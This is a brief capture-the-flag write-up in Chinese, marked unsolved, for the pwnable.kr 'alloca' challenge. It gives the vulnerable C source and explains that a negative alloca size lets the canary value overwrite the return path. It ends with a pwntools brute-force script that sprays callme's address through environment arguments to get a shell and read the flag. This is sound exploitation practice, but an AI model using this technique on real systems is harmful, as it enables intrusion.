# alloca

**未解決**


這題 remote 有 aslr

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void callme(){
        system("/bin/sh");
}

void clear_newlines(){
        int c;
        do{
                c = getchar();
        }while (c != '\n' && c != EOF);
}

int g_canary;
int check_canary(int canary){
        int result = canary ^ g_canary;
        int canary_after = canary;
        int canary_before = g_canary;
        printf("canary before using buffer : %d\n", canary_before);
        printf("canary after using buffer : %d\n\n", canary_after);
        if(result != 0){
                printf("what the ....??? how did you messed this buffer????\n");
        }
        else{
                printf("I told you so. its trivially easy to prevent BOF :)\n");
                printf("therefore as you can see, it is easy to make secure software\n");
        }
        return result;
}

int size;
char* buffer;
int main(){

        printf("- BOF(buffer overflow) is very easy to prevent. here is how to.\n\n");
        sleep(1);
        printf("   1. allocate the buffer size only as you need it\n");
        printf("   2. know your buffer size and limit the input length\n\n");

        printf("- simple right?. let me show you.\n\n");
        sleep(1);

        printf("- whats the maximum length of your buffer?(byte) : ");
        scanf("%d", &size);
        clear_newlines();

        printf("- give me your random canary number to prove there is no BOF : ");
        scanf("%d", &g_canary);
        clear_newlines();

        printf("- ok lets allocate a buffer of length %d\n\n", size);
        sleep(1);

        buffer = alloca( size + 4 );    // 4 is for canary

        printf("- now, lets put canary at the end of the buffer and get your data\n");
        printf("- don't worry! fgets() securely limits your input after %d bytes :)\n", size);
        printf("- if canary is not changed, we can prove there is no BOF :)\n");
        printf("$ ");

        memcpy(buffer+size, &g_canary, 4);      // canary will detect overflow.
        fgets(buffer, size, stdin);             // there is no way you can exploit this.

        printf("\n");
        printf("- now lets check canary to see if there was overflow\n\n");

        check_canary( *((int*)(buffer+size)) );
        return 0;
}
```

size 可以輸入負數，這樣就可以讓stack變小，放ret放在stack

但是會影響到 fgets ，他有去檢查如果size為負數，就不會做相關操作

我們也不需要用到 fgets ， 我們可以讓 stack 變小 ，寫 env 的大概位置到上 canary ，這樣在 ret 的時候就會跳上  shell ，需要用到 shellcode env spary


```python
from pwn import *

context.log_level = 'debug'

callme_addr = 0x080485AB
argv = []
for i in range(10):
    argv.append(p32(callme_addr) * 300 )


# shell = ssh('alloca' ,'pwnable.kr' ,password='guest', port=2222)
for i in range(100):
    # p = shell.process(executable='./alloca', argv=argv)
    p = process(executable='./alloca', argv=argv)

    p.recvuntil("byte")
    p.sendline("-74")

    p.recvuntil("BOF")
    p.sendline("-4980736")

    p.recvuntil("????")
    p.sendline("cat flag")
    r=p.recvline()
    print(r)
    try:
        p.sendline("cat flag")
        r=p.recvline()
        print(r)
        break
    except:
        pass
#p.interactive()
```